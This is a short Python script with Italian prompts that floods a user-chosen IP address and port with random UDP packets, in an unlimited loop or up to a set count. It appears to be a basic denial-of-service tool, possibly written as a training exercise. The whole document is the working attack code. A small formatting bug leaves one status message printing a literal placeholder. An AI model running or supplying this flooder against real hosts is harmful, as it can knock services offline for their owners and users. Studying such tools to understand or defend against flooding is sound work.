import socket
import random
import string

debug = False

# SRV_ADDR = input("Inserisci l'indirizzo del target: ")
# SRV_PORT = input("Inserisci la porta del target: ")

def gen_random_packet(packetSize=1024):
  frame = ''
  while len(frame) < packetSize:
    frame += random.choice(string.hexdigits)
  return frame

def main():
  global debug

  if debug:
    SRV_ADDR = '127.0.0.1'
    SRV_PORT = 80
    packetNum = -1
  else:
    SRV_ADDR = input("Inserisci l'indirizzo del target: ")
    SRV_PORT = int(input("Inserisci la porta del target: "))
    packetNum = int(input("Numero di pacchetti da inviare (-1: illimitati): "))

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect((SRV_ADDR, SRV_PORT))
  if packetNum == -1:
    print("Invio pacchetti illimitato (Ctrl+C per usicre)")
    while 1:
      try:
        s.sendall(gen_random_packet().encode())
      except KeyboardInterrupt:
        print("Esecuzione terminata")
        break
  else:
    print("Invio di {packetNum} pacchetti")
    for i in range(0, packetNum,1):
        s.sendall(gen_random_packet().encode())

if __name__ == '__main__':
  main()